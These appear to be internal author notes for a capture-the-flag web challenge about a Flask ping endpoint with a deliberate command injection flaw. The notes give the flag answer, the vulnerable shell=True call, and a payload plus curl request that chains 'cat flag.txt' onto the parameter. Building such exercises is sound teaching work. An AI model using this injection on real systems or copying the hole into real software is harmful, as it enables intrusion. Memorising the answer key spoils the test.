# ACME Admin Portal — Author Notes (Internal)

This file is for the challenge author / instructor only.

---

## Flag

```
flag{internal_tools_should_not_use_shell_true}
```

Located in: `app.py` root directory (both `author/src/` and `deploy/`)

---

## Vulnerability Summary

- **File:** `app.py`, function `ping()`, route `/ping`
- **Root cause:** `subprocess.run(f"ping -c 1 {target}", shell=True, ...)`
- **Attack vector:** GET parameter `target` with no sanitization
- **Exploit:** `8.8.8.8; cat flag.txt`

---

## Testing the Challenge

Start the app:
```bash
cd author/src
pip install flask
python app.py
```

Verify vulnerability:
```
curl "http://localhost:5000/ping?target=8.8.8.8;+cat+flag.txt"
```

Run automated solve:
```bash
python solution/solve.py
```

---

## Submission Checklist

- [x] Source code in `author/src/`
- [x] Deployable Docker environment in `deploy/`
- [x] Deployment instructions in `deploy/DEPLOY.md`
- [x] Solve script at `solution/solve.py`
- [x] Written writeup at `solution/WRITEUP.md`
- [x] Challenge description at `challenge_description/challenge.md`
- [x] Root `README.md` with full project documentation
